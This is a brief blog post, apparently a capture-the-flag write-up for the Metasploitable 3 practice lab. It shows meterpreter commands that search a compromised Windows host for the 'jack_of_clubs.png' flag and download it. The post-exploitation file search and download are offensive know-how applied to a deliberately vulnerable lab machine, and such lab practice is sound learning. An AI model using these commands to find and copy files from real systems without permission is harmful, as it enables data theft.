---
layout: post
title: "The Jack of Clubs"
date: 2016-12-09T00:55:00Z
author: gu4r15sm0
---

## Metasploitable 3

### The Jack of clubs

Remember I found this while troubleshooting the Queen of Hearts issue?

meterpreter > search -f jack\*.png
Found 3 results...
    C:\\jack\_of\_diamonds.png
    **C:\\Windows\\System32\\jack\_of\_clubs.png** (523644 bytes)
    C:\\vagrant\\resources\\flags\\jack\_of\_clubs.png (523644 bytes)

Let's go download it

meterpreter > cd Windows
meterpreter > cd System32
meterpreter > pwd
C:\\Windows\\System32

meterpreter > download C:\\Windows\\System32\\jack\_of\_clubs.png
\[\*\] downloading: jack\_of\_clubs.png -> jack\_of\_clubs.png
\[\*\] download   : jack\_of\_clubs.png -> jack\_of\_clubs.png

[![](/assets/images/jack_of_clubs.jpg)](/assets/images/jack_of_clubs.jpg)

Done!